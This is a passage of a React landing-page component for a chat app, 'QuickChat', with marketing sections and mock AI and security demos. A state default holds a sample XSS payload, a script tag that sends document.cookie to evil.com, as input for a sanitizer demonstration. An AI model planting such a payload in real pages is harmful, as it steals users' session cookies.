import React, { useContext, useRef, useState } from "react";
import { Link, useNavigate } from "react-router-dom";
import { AuthContext } from "../../context/AuthContext";
import {
  MessageSquare,
  Video,
  Users,
  Bot,
  Shield,
  Zap,
  ArrowRight,
  Sparkles,
  Smartphone,
  Globe,
  Send,
  Check,
  AlertTriangle,
  RefreshCw,
  Lock,
  Download,
  Trash2,
  Cookie,
  Server,
} from "lucide-react";

export const LandingPage = () => {
  const authContext = useContext(AuthContext);
  const authUser = authContext?.authUser;
  const navigate = useNavigate();
  const featureRef = useRef<HTMLElement | null>(null);
  const aiRef = useRef<HTMLElement | null>(null);


  const scrollToFeatures = () => {
    featureRef.current?.scrollIntoView({ behavior: "smooth" });
  };
  const scrollToAi = () => {
    aiRef.current?.scrollIntoView({ behavior: "smooth" });
  };

  const [activeTab, setActiveTab] = useState<"summarizer" | "replies" | "toxicity">("summarizer");

  // Conversational Summarizer States
  const [summarizeState, setSummarizeState] = useState<"idle" | "loading" | "done">("idle");

  // Smart Replies States
  const [repliesInput, setRepliesInput] = useState("");
  const [repliesMessages, setRepliesMessages] = useState([
    { sender: "other", text: "Hey! Did anyone review the deployment logs for the staging environment?" },
    { sender: "other", text: "We need to verify if the MongoDB connection pool limits are scaling properly." }
  ]);

  // Toxicity Shield States
  const [toxicityMessage, setToxicityMessage] = useState("This API is garbage, you guys suck!");
  const [toxicityResult, setToxicityResult] = useState<"idle" | "blocked" | "passed">("idle");
  const [toxicityScore, setToxicityScore] = useState(0);

  const securityRef = useRef<HTMLElement | null>(null);
  const scrollToSecurity = () => {
    securityRef.current?.scrollIntoView({ behavior: "smooth" });
  };

  const [activeSecurityTab, setActiveSecurityTab] = useState<"jwt" | "firewall" | "portability" | "purge">("jwt");

  // JWT Security States
  const [jwtSimState, setJwtSimState] = useState<"idle" | "stolen" | "secured">("idle");
  const [hackerMessage, setHackerMessage] = useState("");

  // Sanitizer / XSS Filter States
  const [sanitizedInput, setSanitizedInput] = useState("<script>fetch('http://evil.com/steal?c=' + document.cookie)</script>");
  const [sanitizedOutput, setSanitizedOutput] = useState("");
  const [sanitizedActive, setSanitizedActive] = useState(false);

  // Data Portability States
  const [exportState, setExportState] = useState<"idle" | "exporting" | "done">("idle");

  // Account Purge States
  const [purgeStep, setPurgeStep] = useState<"idle" | "deleting_user" | "deleting_messages" | "deleting_calls" | "completed">("idle");

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 flex flex-col selection:bg-indigo-500 selection:text-white overflow-x-hidden">
      {/* Background Gradients */}
      <div className="absolute top-0 left-1/2 -translate-x-1/2 w-full max-w-7xl h-[500px] pointer-events-none opacity-20">
        <div className="absolute top-[-10%] left-[10%] w-[400px] h-[400px] rounded-full bg-indigo-600 blur-[120px]" />
        <div className="absolute top-[20%] right-[10%] w-[350px] h-[350px] rounded-full bg-violet-600 blur-[120px]" />
      </div>

      {/* Navigation */}
      <header className="border-b border-slate-800/80 backdrop-blur-md sticky top-0 z-50">
        <div className="max-w-7xl mx-auto px-6 h-16 flex items-center justify-between">
          <div className="flex items-center gap-2 cursor-pointer" onClick={() => navigate("/")}>
            <div className="w-9 h-9 rounded-lg bg-indigo-600 flex items-center justify-center font-bold text-lg text-white shadow-lg shadow-indigo-600/30">
              Q
            </div>
            <span className="font-bold text-xl tracking-tight bg-gradient-to-r from-white to-slate-400 bg-clip-text text-transparent">
              QuickChat
            </span>
          </div>

          <nav className="hidden md:flex items-center gap-8 text-sm font-medium text-slate-300">
            <button className="hover:text-indigo-400 transition-colors cursor-pointer" onClick={scrollToFeatures}>Features</button>
            <Link to={authUser ? '/chat' : '/login'} className="hover:text-indigo-400 transition-colors cursor-pointer">Video Call</Link>
            <button className="hover:text-indigo-400 transition-colors cursor-pointer" onClick={scrollToAi}>AI Power</button>
            <button className="hover:text-indigo-400 transition-colors cursor-pointer" onClick={scrollToSecurity}>Security</button>
          </nav>

          <div className="flex items-center gap-4">
            {authUser ? (
              <Link
                to="/chat"
                className="bg-indigo-600 hover:bg-indigo-500 transition-all font-medium text-sm text-white px-5 py-2.5 rounded-lg shadow-lg shadow-indigo-600/20 hover:shadow-indigo-600/30 hover:scale-[1.02] active:scale-95"
              >
                Go to Workspace
              </Link>
            ) : (
              <>
                {/* <Link
                  to="/login"
                  className="text-sm font-medium hover:text-white text-slate-300 transition-colors"
                >
                  Sign In
                </Link> */}
                <Link
                  to="/login"
                  className="bg-indigo-600 hover:bg-indigo-500 transition-all font-medium text-sm text-white px-5 py-2.5 rounded-lg shadow-lg shadow-indigo-600/20 hover:shadow-indigo-600/30 hover:scale-[1.02] active:scale-95"
                >
                  Get Started Free
                </Link>
              </>
            )}
          </div>
        </div>
      </header>

      {/* Hero Section */}
      <section className="relative pt-24 pb-20 px-6 max-w-7xl mx-auto flex flex-col items-center text-center">
        <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full border border-indigo-500/30 bg-indigo-500/10 text-indigo-400 text-xs font-semibold uppercase tracking-wider mb-8 animate-pulse">
          <Sparkles className="w-3.5 h-3.5" /> Introducing Version 2.0
        </div>

        <h1 className="text-5xl md:text-7xl font-extrabold tracking-tight max-w-4xl leading-tight mb-8">
          The Ultimate Platform for{" "}
          <span className="bg-gradient-to-r from-indigo-400 via-purple-400 to-pink-500 bg-clip-text text-transparent">
            Real-Time Collaboration
          </span>
        </h1>

        <p className="text-lg md:text-xl text-slate-400 max-w-2xl mb-10 leading-relaxed">
          Experience HD WebRTC voice/video calls, secure multi-device chat, group workspaces, and advanced AI-powered assistant tools in a premium interface.
        </p>

        <div className="flex flex-col sm:flex-row gap-4 mb-16">
          {authUser ? (
            <Link
              to="/chat"
              className="bg-indigo-600 hover:bg-indigo-500 transition-all font-semibold text-white px-8 py-4 rounded-xl shadow-xl shadow-indigo-600/35 hover:scale-[1.03] active:scale-95 flex items-center justify-center gap-2 group"
            >
              Enter Dashboard <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
            </Link>
          ) : (
            <>
              <Link
                to="/login"
                className="bg-indigo-600 hover:bg-indigo-500 transition-all font-semibold text-white px-8 py-4 rounded-xl shadow-xl shadow-indigo-600/35 hover:scale-[1.03] active:scale-95 flex items-center justify-center gap-2 group"
              >
                Create Free Account <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
              </Link>
              <a
                href="#features"
                className="border border-slate-700 hover:border-slate-500 bg-slate-900/50 hover:bg-slate-900 transition-all font-semibold text-slate-200 px-8 py-4 rounded-xl flex items-center justify-center"
              >
                Explore Features
              </a>
            </>
          )}
        </div>

        {/* Hero Product Mockup */}
        <div className="w-full max-w-5xl rounded-2xl border border-slate-800 bg-slate-900/40 p-3 backdrop-blur-sm shadow-2xl relative">
          <div className="absolute inset-0 bg-indigo-500/10 rounded-2xl blur-xl -z-10" />
          <div className="aspect-[16/9] rounded-xl overflow-hidden bg-slate-950 border border-slate-800/80 relative flex items-center justify-center">
            {/* Mock Chat App Layout */}
            <div className="absolute inset-0 flex">
              {/* Sidebar */}
              <div className="w-1/4 border-r border-slate-800 bg-slate-900/30 p-4 flex flex-col gap-4 text-left">
                <div className="h-4 w-2/3 bg-slate-800 rounded-md" />
                <div className="h-8 w-full bg-slate-800/50 rounded-lg" />
                <div className="flex flex-col gap-3 mt-4">
                  {[1, 2, 3].map((i) => (
                    <div key={i} className="flex items-center gap-2 p-2 rounded-lg bg-slate-800/30">
                      <div className="w-8 h-8 rounded-full bg-slate-700" />
                      <div className="flex-1 flex flex-col gap-1.5">
                        <div className="h-3 w-1/2 bg-slate-700 rounded" />
                        <div className="h-2 w-3/4 bg-slate-800 rounded" />
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              {/* Chat Container */}
              <div className="flex-1 bg-slate-950 flex flex-col">
                {/* Header */}
                <div className="h-14 border-b border-slate-800 px-6 flex items-center justify-between text-left">
                  <div className="flex items-center gap-2">
                    <div className="w-8 h-8 rounded-full bg-indigo-600" />
                    <div className="h-3 w-24 bg-slate-800 rounded" />
                  </div>
                  <div className="flex gap-2">
                    <div className="w-8 h-8 rounded bg-slate-800" />
                    <div className="w-8 h-8 rounded bg-slate-800" />
                  </div>
                </div>

                {/* Messages Body */}
                <div className="flex-1 p-6 flex flex-col gap-6 overflow-y-hidden text-left justify-end">
                  <div className="flex gap-3 max-w-[70%]">
                    <div className="w-8 h-8 rounded-full bg-slate-800 flex-shrink-0" />
                    <div className="bg-slate-900 rounded-2xl rounded-tl-none p-3.5 text-xs text-slate-400">
                      Hi! Welcome to the new QuickChat interface. Check out the calling panel.
                    </div>
                  </div>
                  <div className="flex gap-3 max-w-[70%] self-end">
                    <div className="bg-indigo-600 text-white rounded-2xl rounded-tr-none p-3.5 text-xs">
                      Wow! This looks extremely premium and responsive.
                    </div>
                  </div>
                  <div className="flex gap-3 max-w-[70%]">
                    <div className="w-8 h-8 rounded-full bg-slate-800 flex-shrink-0" />
                    <div className="bg-slate-900 rounded-2xl rounded-tl-none p-3.5 text-xs text-slate-400 flex items-center gap-2">
                      <div className="flex gap-1">
                        <span className="w-1.5 h-1.5 bg-slate-400 rounded-full animate-bounce" style={{ animationDelay: "0ms" }} />
                        <span className="w-1.5 h-1.5 bg-slate-400 rounded-full animate-bounce" style={{ animationDelay: "150ms" }} />
                        <span className="w-1.5 h-1.5 bg-slate-400 rounded-full animate-bounce" style={{ animationDelay: "300ms" }} />
                      </div>
                      Is typing...
                    </div>
                  </div>
                </div>

                {/* Input Bar */}
                <div className="p-4 border-t border-slate-800">
                  <div className="h-10 bg-slate-900 rounded-full w-full border border-slate-800" />
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Features Grid */}
      <section id="features" className="py-24 px-6 border-t border-slate-900 bg-slate-950 relative" ref={featureRef}>
        <div className="max-w-7xl mx-auto">
          <div className="text-center max-w-2xl mx-auto mb-20">
            <h2 className="text-3xl md:text-4xl font-extrabold tracking-tight mb-4">
              Everything You Need in a Chat App
            </h2>
            <p className="text-slate-400 leading-relaxed">
              Designed from the ground up to address performance, security, and aesthetic excellence.
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
            <div className="border border-slate-800/80 bg-slate-900/20 p-8 rounded-2xl backdrop-blur-xs flex flex-col gap-4 text-left">
              <div className="w-12 h-12 rounded-xl bg-indigo-500/10 border border-indigo-500/20 flex items-center justify-center text-indigo-400">
                <MessageSquare className="w-6 h-6" />
              </div>
              <h3 className="text-xl font-bold text-white">Real-Time Messaging</h3>
              <p className="text-slate-400 text-sm leading-relaxed">
                Send messages instantly with delivery status, read receipts, text replies, hover reactions, pin lists, and image sharing.
              </p>
            </div>

            <div className="border border-slate-800/80 bg-slate-900/20 p-8 rounded-2xl backdrop-blur-xs flex flex-col gap-4 text-left">
              <div className="w-12 h-12 rounded-xl bg-violet-500/10 border border-violet-500/20 flex items-center justify-center text-violet-400">
                <Video className="w-6 h-6" />
              </div>
              <h3 className="text-xl font-bold text-white">Voice & Video Calling</h3>
              <p className="text-slate-400 text-sm leading-relaxed">
                Connect face-to-face with HD voice and video calls powered by optimized WebRTC peer connections and TURN fallback.
              </p>
            </div>

            <div className="border border-slate-800/80 bg-slate-900/20 p-8 rounded-2xl backdrop-blur-xs flex flex-col gap-4 text-left">
              <div className="w-12 h-12 rounded-xl bg-purple-500/10 border border-purple-500/20 flex items-center justify-center text-purple-400">
                <Users className="w-6 h-6" />
              </div>
              <h3 className="text-xl font-bold text-white">Collaborative Workspaces</h3>
              <p className="text-slate-400 text-sm leading-relaxed">
                Create group chats, manage member permission roles, invite users via join links, and customize group icons.
              </p>
            </div>

            <div className="border border-slate-800/80 bg-slate-900/20 p-8 rounded-2xl backdrop-blur-xs flex flex-col gap-4 text-left">
              <div className="w-12 h-12 rounded-xl bg-pink-500/10 border border-pink-500/20 flex items-center justify-center text-pink-400">
                <Bot className="w-6 h-6" />
              </div>
              <h3 className="text-xl font-bold text-white">AI Copilot Integrated</h3>
              <p className="text-slate-400 text-sm leading-relaxed">
                Get smart suggestions, conversational summaries, grammar correction, and instant automated replies powered by Llama models.
              </p>
            </div>

            <div className="border border-slate-800/80 bg-slate-900/20 p-8 rounded-2xl backdrop-blur-xs flex flex-col gap-4 text-left">
              <div className="w-12 h-12 rounded-xl bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center text-emerald-400">
                <Shield className="w-6 h-6" />
              </div>
              <h3 className="text-xl font-bold text-white">Advanced Security</h3>
              <p className="text-slate-400 text-sm leading-relaxed">
                Benefit from secure HttpOnly cookies, JWT auth pairs, rate limiting, helmet guards, and real-time database audit logs.
              </p>
            </div>

            <div className="border border-slate-800/80 bg-slate-900/20 p-8 rounded-2xl backdrop-blur-xs flex flex-col gap-4 text-left">
              <div className="w-12 h-12 rounded-xl bg-amber-500/10 border border-amber-500/20 flex items-center justify-center text-amber-400">
                <Zap className="w-6 h-6" />
              </div>
              <h3 className="text-xl font-bold text-white">Optimized Performance</h3>
              <p className="text-slate-400 text-sm leading-relaxed">
                Enjoy lazy-loaded components, code splitting, memoized rendering handlers, and responsive CSS structure.
              </p>
            </div>
          </div>
        </div>
      </section>

      {/* AI Power Section */}
      <section id="ai" className="py-24 px-6 border-t border-slate-900 bg-slate-950/40 relative" ref={aiRef}>
        <div className="absolute inset-0 bg-indigo-500/[0.01] pointer-events-none" />
        <div className="max-w-6xl mx-auto">
          <div className="text-center max-w-2xl mx-auto mb-16 animate-fadeIn">
            <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full border border-indigo-500/30 bg-indigo-500/10 text-indigo-400 text-xs font-semibold uppercase tracking-wider mb-4">
              <Bot className="w-3.5 h-3.5 animate-bounce" /> Built-In AI Engine
            </div>
            <h2 className="text-3xl md:text-4xl font-extrabold tracking-tight mb-4">
              Supercharge Conversations with Llama 3.1
            </h2>
            <p className="text-slate-400 leading-relaxed text-sm md:text-base">
              Experience conversational channel text summaries, automated smart reply recommendations, and integrated real-time text toxicity shields.
            </p>
          </div>

          {/* Premium Glassmorphic AI Box */}
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-stretch">
            {/* Left Column: Tab Selectors */}
            <div className="lg:col-span-4 flex flex-col gap-3 justify-center">
              <button
                onClick={() => setActiveTab("summarizer")}
                className={`w-full text-left p-5 rounded-2xl border transition-all duration-300 flex flex-col gap-2 cursor-pointer ${activeTab === "summarizer"
                  ? "bg-indigo-600/15 border-indigo-500/40 shadow-lg shadow-indigo-600/5 text-white"
                  : "bg-slate-900/30 border-slate-800/80 text-slate-400 hover:bg-slate-900/50 hover:text-slate-200"
                  }`}
              >
                <div className="flex items-center gap-3 font-bold text-sm md:text-base">
                  <span className="p-2 rounded-lg bg-indigo-500/10 text-indigo-400">
                    <Sparkles className="w-5 h-5" />
                  </span>
                  Conversational Summarizer
                </div>
                <p className="text-xs text-slate-400 leading-relaxed pl-11">
                  Collapse long channel backlogs and message history into brief, actionable takeaways instantly.
                </p>
              </button>

              <button
                onClick={() => setActiveTab("replies")}
                className={`w-full text-left p-5 rounded-2xl border transition-all duration-300 flex flex-col gap-2 cursor-pointer ${activeTab === "replies"
                  ? "bg-indigo-600/15 border-indigo-500/40 shadow-lg shadow-indigo-600/5 text-white"
                  : "bg-slate-900/30 border-slate-800/80 text-slate-400 hover:bg-slate-900/50 hover:text-slate-200"
                  }`}
              >
                <div className="flex items-center gap-3 font-bold text-sm md:text-base">
                  <span className="p-2 rounded-lg bg-violet-500/10 text-violet-400">
                    <MessageSquare className="w-5 h-5" />
                  </span>
                  Smart Suggestions
                </div>
                <p className="text-xs text-slate-400 leading-relaxed pl-11">
                  Draft instantaneous context-aware quick replies to teammate prompts in a single click.
                </p>
              </button>

              <button
                onClick={() => setActiveTab("toxicity")}
                className={`w-full text-left p-5 rounded-2xl border transition-all duration-300 flex flex-col gap-2 cursor-pointer ${activeTab === "toxicity"
                  ? "bg-indigo-600/15 border-indigo-500/40 shadow-lg shadow-indigo-600/5 text-white"
                  : "bg-slate-900/30 border-slate-800/80 text-slate-400 hover:bg-slate-900/50 hover:text-slate-200"
                  }`}
              >
                <div className="flex items-center gap-3 font-bold text-sm md:text-base">
                  <span className="p-2 rounded-lg bg-pink-500/10 text-pink-400">
                    <Shield className="w-5 h-5" />
                  </span>
                  Toxicity Shield
                </div>
                <p className="text-xs text-slate-400 leading-relaxed pl-11">
                  Protect workspaces with server-side AI filtering that intercepts offensive language before dispatch.
                </p>
              </button>
            </div>

            {/* Right Column: Display Demo Canvas */}
            <div className="lg:col-span-8 border border-slate-800/80 bg-slate-900/30 rounded-3xl p-6 md:p-8 flex flex-col justify-between min-h-[440px] backdrop-blur-md relative overflow-hidden">
              <div className="absolute top-0 right-0 w-64 h-64 bg-indigo-600/5 rounded-full blur-3xl pointer-events-none" />

              {/* --- Conversational Summarizer VIEW --- */}
              {activeTab === "summarizer" && (
                <div className="flex-1 flex flex-col justify-between h-full animate-fadeIn">
                  <div>
                    <div className="flex items-center justify-between border-b border-slate-800/80 pb-4 mb-4">
                      <div className="flex items-center gap-2">
                        <span className="w-3 h-3 rounded-full bg-emerald-500" />
                        <span className="font-bold text-sm text-slate-300">#engineering-sync</span>
                      </div>
                      <span className="text-xs text-slate-500">4 messages unread</span>
                    </div>

                    {summarizeState === "idle" && (
                      <div className="space-y-3 opacity-90 transition-opacity">
                        <div className="flex flex-col md:flex-row gap-1 md:gap-2 text-xs text-left">
                          <span className="font-bold text-indigo-400 whitespace-nowrap">Sarah (Dev):</span>
                          <span className="text-slate-300">Hey team, the MongoDB connection pool keeps hitting the 100 limit. I think it is starting to throttle backend API endpoints.</span>
                        </div>
                        <div className="flex flex-col md:flex-row gap-1 md:gap-2 text-xs text-left">
                          <span className="font-bold text-violet-400 whitespace-nowrap">Devansh (Lead):</span>
                          <span className="text-slate-300">We should raise the maxPoolSize to 250 in the URI parameters and check if our connections are releasing properly in the controller middleware.</span>
                        </div>
                        <div className="flex flex-col md:flex-row gap-1 md:gap-2 text-xs text-left">
                          <span className="font-bold text-indigo-400 whitespace-nowrap">Sarah (Dev):</span>
                          <span className="text-slate-300">Okay, I will apply that upgrade now and deploy to staging. Let me know when you can test.</span>
                        </div>
                        <div className="flex flex-col md:flex-row gap-1 md:gap-2 text-xs text-left">
                          <span className="font-bold text-pink-400 whitespace-nowrap">Marc (QA):</span>
                          <span className="text-slate-300">Awesome. I am online. Send me the staging invite code as soon as it is deployed so I can run regression suites.</span>
                        </div>
                      </div>
                    )}

                    {summarizeState === "loading" && (
                      <div className="h-44 flex flex-col items-center justify-center gap-3">
                        <RefreshCw className="w-8 h-8 text-indigo-400 animate-spin" />
                        <span className="text-sm font-medium text-slate-400 animate-pulse text-center px-4">Llama 3.1 is reading channel logs & extracting key takeaways...</span>
                      </div>
                    )}

                    {summarizeState === "done" && (
                      <div className="space-y-4 animate-fadeIn text-left">
                        <div className="bg-indigo-500/10 border border-indigo-500/20 rounded-xl p-4">
                          <div className="flex items-center gap-2 mb-2 text-indigo-300 text-xs font-bold uppercase tracking-wider">
                            <Sparkles className="w-3.5 h-3.5" /> AI Channel Summary
                          </div>
                          <ul className="space-y-2 text-xs md:text-sm text-slate-300 list-disc pl-4 leading-relaxed">
                            <li><strong>Issue identified:</strong> MongoDB connection pool limit (100) causing API throttling.</li>
                            <li><strong>Action taken:</strong> Raising connection pool size limit parameters to 250 in URI configs.</li>
                            <li><strong>Deployment:</strong> Sarah to deploy update to staging; Marc to test regression suite post-deployment.</li>
                          </ul>
                        </div>
                      </div>
                    )}
                  </div>

                  <div className="mt-6 flex gap-3 border-t border-slate-800/80 pt-4 justify-end">
                    {summarizeState === "done" ? (
                      <button
                        onClick={() => setSummarizeState("idle")}
                        className="flex items-center gap-2 bg-slate-800 hover:bg-slate-700 transition-colors text-xs font-bold px-4 py-2.5 rounded-lg text-slate-300 cursor-pointer"
                      >
                        Reset Mockup
                      </button>
                    ) : (
                      <button
                        onClick={() => {
                          setSummarizeState("loading");
                          setTimeout(() => setSummarizeState("done"), 1500);
                        }}
                        disabled={summarizeState === "loading"}
                        className="flex items-center gap-2 bg-indigo-600 hover:bg-indigo-500 disabled:bg-indigo-800 transition-all font-bold text-xs text-white px-5 py-2.5 rounded-lg shadow-lg shadow-indigo-600/20 cursor-pointer"
                      >
                        <Sparkles className="w-4 h-4" /> Summarize Channel
                      </button>
                    )}
                  </div>
                </div>
              )}

              {/* --- Smart Suggestions VIEW --- */}
              {activeTab === "replies" && (
                <div className="flex-1 flex flex-col justify-between h-full animate-fadeIn text-left">
                  <div>
                    <div className="flex items-center justify-between border-b border-slate-800/80 pb-4 mb-4">
                      <div className="flex items-center gap-2">
                        <div className="w-6 h-6 rounded-full bg-violet-600 flex items-center justify-center font-bold text-xs text-white">S</div>
                        <span className="font-bold text-sm text-slate-300">Sarah Jenkins (Dev)</span>
                      </div>
                      <span className="text-xs text-indigo-400 font-bold uppercase tracking-wider flex items-center gap-1 animate-pulse">
                        <Zap className="w-3 h-3" /> Live Prompt
                      </span>
                    </div>

                    <div className="space-y-4 mb-6 max-h-[220px] overflow-y-auto pr-2">
                      {repliesMessages.map((msg, index) => (
                        <div
                          key={index}
                          className={`flex gap-3 max-w-[80%] ${msg.sender === "user" ? "self-end ml-auto justify-end" : ""}`}
                        >
                          {msg.sender === "other" && (
                            <div className="w-8 h-8 rounded-full bg-slate-800 flex-shrink-0 flex items-center justify-center text-xs font-bold text-slate-400">SJ</div>
                          )}
                          <div
                            className={`p-3 text-xs md:text-sm rounded-2xl ${msg.sender === "user"
                              ? "bg-indigo-600 text-white rounded-tr-none"
                              : "bg-slate-900/60 text-slate-300 rounded-tl-none border border-slate-800/50"
                              }`}
                          >
                            {msg.text}
                          </div>
                        </div>
                      ))}
                    </div>
                  </div>

                  <div>
                    {/* Suggestion Chips */}
                    <div className="flex flex-wrap gap-2 mb-4 animate-fadeIn">
                      {["On my way! 🏃‍♂️", "Can we push back 10m? ⏰", "Let me check the logs 🔍"].map((chip) => (
                        <button
                          key={chip}
                          onClick={() => setRepliesInput(chip)}
                          className="bg-violet-950/40 hover:bg-violet-900/40 border border-violet-500/20 hover:border-violet-500/40 text-violet-300 text-xs px-3.5 py-1.5 rounded-full transition-all cursor-pointer hover:scale-102 active:scale-98"
                        >
                          {chip}
                        </button>
                      ))}
                    </div>

                    {/* Chat Input Simulation */}
                    <form
                      onSubmit={(e) => {
                        e.preventDefault();
                        if (!repliesInput.trim()) return;
                        const newMsg = { sender: "user" as const, text: repliesInput };
                        setRepliesMessages((prev) => [...prev, newMsg]);
                        setRepliesInput("");
                      }}
                      className="flex gap-2 items-center"
                    >
                      <input
                        type="text"
                        value={repliesInput}
                        onChange={(e) => setRepliesInput(e.target.value)}
                        placeholder="Select an AI response chip above or type..."
                        className="flex-1 bg-slate-950 border border-slate-800 rounded-xl px-4 py-2.5 text-xs text-slate-300 focus:outline-none focus:border-violet-500"
                      />
                      <button
                        type="submit"
                        className="bg-violet-600 hover:bg-violet-500 transition-colors p-2.5 rounded-xl text-white cursor-pointer"
                      >
                        <Send className="w-4 h-4" />
                      </button>
                      {repliesMessages.length > 2 && (
                        <button
                          type="button"
                          onClick={() => setRepliesMessages([
                            { sender: "other", text: "Hey! Did anyone review the deployment logs for the staging environment?" },
                            { sender: "other", text: "We need to verify if the MongoDB connection pool limits are scaling properly." }
                          ])}
                          className="bg-slate-800 hover:bg-slate-700 text-slate-400 p-2.5 rounded-xl cursor-pointer"
                        >
                          <RefreshCw className="w-4 h-4" />
                        </button>
                      )}
                    </form>
                  </div>
                </div>
              )}

              {/* --- Toxicity Shield VIEW --- */}
              {activeTab === "toxicity" && (
                <div className="flex-1 flex flex-col justify-between h-full animate-fadeIn text-left">
                  <div>
                    <div className="flex items-center justify-between border-b border-slate-800/80 pb-4 mb-4">
                      <div className="flex items-center gap-2">
                        <span className="w-3 h-3 rounded-full bg-pink-500 animate-pulse" />
                        <span className="font-bold text-sm text-slate-300">Toxicity Shield Firewall v1.2</span>
                      </div>
                      <span className="text-xs text-slate-500">Express Middleware Layer</span>
                    </div>

                    <div className="space-y-4">
                      <div className="flex flex-col gap-2">
                        <label className="text-xs font-bold text-slate-400">Simulation Message Input</label>
                        <textarea
                          rows={2}
                          value={toxicityMessage}
                          onChange={(e) => {
                            setToxicityMessage(e.target.value);
                            setToxicityResult("idle");
                          }}
                          placeholder="Type something toxic or clean to test..."
                          className="w-full bg-slate-950 border border-slate-800 rounded-xl p-3.5 text-xs text-slate-300 focus:outline-none focus:border-pink-500 resize-none font-mono"
                        />
                      </div>

                      {/* Display Results */}
                      {toxicityResult === "blocked" && (
                        <div className="bg-pink-500/10 border border-pink-500/30 rounded-xl p-4 flex gap-3 items-start animate-fadeIn">
                          <AlertTriangle className="w-5 h-5 text-pink-400 flex-shrink-0 mt-0.5" />
                          <div className="text-xs">
                            <div className="font-bold text-pink-400 uppercase tracking-wider mb-1">Message Blocked by Server API</div>
                            <p className="text-slate-300 mb-2">Toxicity detected: <span className="font-bold text-pink-400">{toxicityScore}% score</span>. The message content was intercepted and restricted from DB storage.</p>
                            <button
                              type="button"
                              onClick={() => {
                                setToxicityMessage("Great work on the backend updates, teammates!");
                                setToxicityResult("idle");
                              }}
                              className="text-pink-400 hover:text-pink-300 font-bold underline cursor-pointer text-left"
                            >
                              Auto-populate Clean Friendly Message
                            </button>
                          </div>
                        </div>
                      )}

                      {toxicityResult === "passed" && (
                        <div className="bg-emerald-500/10 border border-emerald-500/30 rounded-xl p-4 flex gap-3 items-start animate-fadeIn">
                          <Check className="w-5 h-5 text-emerald-400 flex-shrink-0 mt-0.5" />
                          <div className="text-xs">
                            <div className="font-bold text-emerald-400 uppercase tracking-wider mb-1">Message Approved (Toxicity: 2%)</div>
                            <p className="text-slate-300">Message successfully sanitized, socket dispatched, and stored in MongoDB database.</p>
                          </div>
                        </div>
                      )}
                    </div>
                  </div>

                  <div className="mt-6 flex gap-3 border-t border-slate-800/80 pt-4 justify-end">
                    <button
                      onClick={() => {
                        setToxicityMessage("This API is garbage, you guys suck!");
                        setToxicityResult("idle");
                      }}
                      className="bg-slate-800 hover:bg-slate-700 transition-colors text-xs font-bold px-4 py-2.5 rounded-lg text-slate-300 cursor-pointer"
                    >
                      Reset Input
                    </button>
                    <button
                      onClick={() => {
                        const lowercaseMsg = toxicityMessage.toLowerCase();
                        const isToxic = lowercaseMsg.includes("garbage") || lowercaseMsg.includes("suck") || lowercaseMsg.includes("hate") || lowercaseMsg.includes("trash");
                        if (isToxic) {
                          setToxicityScore(89);
                          setToxicityResult("blocked");
                        } else {
                          setToxicityScore(2);
                          setToxicityResult("passed");
                        }
                      }}
                      className="bg-pink-600 hover:bg-pink-500 transition-all font-bold text-xs text-white px-5 py-2.5 rounded-lg shadow-lg shadow-pink-600/20 cursor-pointer"
                    >
                      Process & Send Message
                    </button>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      </section>

      {/* Security Compliance Section */}
      <section id="security" className="py-24 px-6 border-t border-slate-900 bg-slate-950 relative animate-fadeIn" ref={securityRef}>
        <div className="absolute inset-0 bg-emerald-500/[0.01] pointer-events-none" />
        <div className="max-w-6xl mx-auto">
          <div className="text-center max-w-2xl mx-auto mb-16 animate-fadeIn text-left md:text-center">
            <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full border border-emerald-500/30 bg-emerald-500/10 text-emerald-400 text-xs font-semibold uppercase tracking-wider mb-4">
              <Lock className="w-3.5 h-3.5" /> Platform Security
            </div>
            <h2 className="text-3xl md:text-4xl font-extrabold tracking-tight mb-4">
              GDPR-Compliant, Hardened Architecture
            </h2>
            <p className="text-slate-400 leading-relaxed text-sm md:text-base">
              Explore the advanced security policies, token management isolation strategies, and microservices firewalls securing client conversations.
            </p>
          </div>

          {/* Premium Glassmorphic Security Box */}
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-stretch">
            {/* Left Column: Tab Selectors */}
            <div className="lg:col-span-4 flex flex-col gap-3 justify-center">
              <button
                onClick={() => setActiveSecurityTab("jwt")}
                className={`w-full text-left p-5 rounded-2xl border transition-all duration-300 flex flex-col gap-2 cursor-pointer ${activeSecurityTab === "jwt"
                  ? "bg-emerald-600/15 border-emerald-500/40 shadow-lg shadow-emerald-600/5 text-white"
                  : "bg-slate-900/30 border-slate-800/80 text-slate-400 hover:bg-slate-900/50 hover:text-slate-200"
                  }`}
              >
                <div className="flex items-center gap-3 font-bold text-sm md:text-base">
                  <span className="p-2 rounded-lg bg-emerald-500/10 text-emerald-400">
                    <Cookie className="w-5 h-5" />
                  </span>
                  HttpOnly JWT Auth
                </div>
                <p className="text-xs text-slate-400 leading-relaxed pl-11">
                  Prevent token theft by isolating authentication credentials inside browser HTTP cookie layers.
                </p>
              </button>

              <button
                onClick={() => setActiveSecurityTab("firewall")}
                className={`w-full text-left p-5 rounded-2xl border transition-all duration-300 flex flex-col gap-2 cursor-pointer ${activeSecurityTab === "firewall"
                  ? "bg-emerald-600/15 border-emerald-500/40 shadow-lg shadow-emerald-600/5 text-white"
                  : "bg-slate-900/30 border-slate-800/80 text-slate-400 hover:bg-slate-900/50 hover:text-slate-200"
                  }`}
              >
                <div className="flex items-center gap-3 font-bold text-sm md:text-base">
                  <span className="p-2 rounded-lg bg-indigo-500/10 text-indigo-400">
                    <Server className="w-5 h-5" />
                  </span>
                  Toxicity & XSS Sanitizer
                </div>
                <p className="text-xs text-slate-400 leading-relaxed pl-11">
                  Enforce strict Express endpoint scanning to identify, strip, and quarantine malicious payloads.
                </p>
              </button>

              <button
                onClick={() => setActiveSecurityTab("portability")}
                className={`w-full text-left p-5 rounded-2xl border transition-all duration-300 flex flex-col gap-2 cursor-pointer ${activeSecurityTab === "portability"
